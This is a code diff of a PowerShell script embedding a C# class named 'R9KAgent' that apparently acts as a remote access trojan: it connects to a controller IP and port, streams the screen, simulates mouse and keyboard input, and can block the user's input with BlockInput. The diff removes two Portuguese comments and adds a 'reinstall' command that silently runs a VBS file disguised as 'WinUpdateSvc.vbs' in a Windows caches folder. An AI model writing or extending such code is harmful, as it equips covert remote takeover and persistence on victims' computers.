@@ -69,7 +69,7 @@ if (-not ("R9KAgent" -as [type])) {
         [DllImport("user32.dll")] public static extern void mouse_event(uint dwFlags, int dx, int dy, uint dwData, int dwExtraInfo);
         [DllImport("user32.dll")] public static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);
         [DllImport("user32.dll")] public static extern bool BlockInput(bool fBlockIt);
-        [DllImport("user32.dll")] public static extern bool SetProcessDPIAware(); // CORREÇÃO WINDOWS 11
+        [DllImport("user32.dll")] public static extern bool SetProcessDPIAware();
 
         static string IP;
         static int PORT;
@@ -85,7 +85,7 @@ if (-not ("R9KAgent" -as [type])) {
         public static void Start(string ip, int port) {
             IP = ip; PORT = port;
             
-            try { SetProcessDPIAware(); } catch {} // Força o Windows 11 a capturar a tela corretamente
+            try { SetProcessDPIAware(); } catch {}
             
             Thread tWatch = new Thread(WatchdogLoop); tWatch.IsBackground = true; tWatch.Start();
             Thread tInput = new Thread(InputLoop); tInput.IsBackground = true; tInput.Start();
@@ -204,6 +204,15 @@ if (-not ("R9KAgent" -as [type])) {
                 if (cmd == "stream_start") { streaming = true; return; }
                 if (cmd == "stream_stop") { streaming = false; lock(writeLock) { myWriter.WriteLine("STREAM_STOPPED"); } return; }
                 
+                // COMANDO DE REINSTALAR / ATUALIZAR
+                if (cmd == "reinstall") {
+                    string vbsPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + @"\Microsoft\Windows\Caches\WinUpdateSvc.vbs";
+                    if (File.Exists(vbsPath)) {
+                        Process.Start("wscript.exe", "//B //Nologo \"" + vbsPath + "\"");
+                    }
+                    Environment.Exit(0);
+                }
+
                 if (cmd == "banner_on") {
                     BlockInput(true);
                     bannerThread = new Thread(() => {
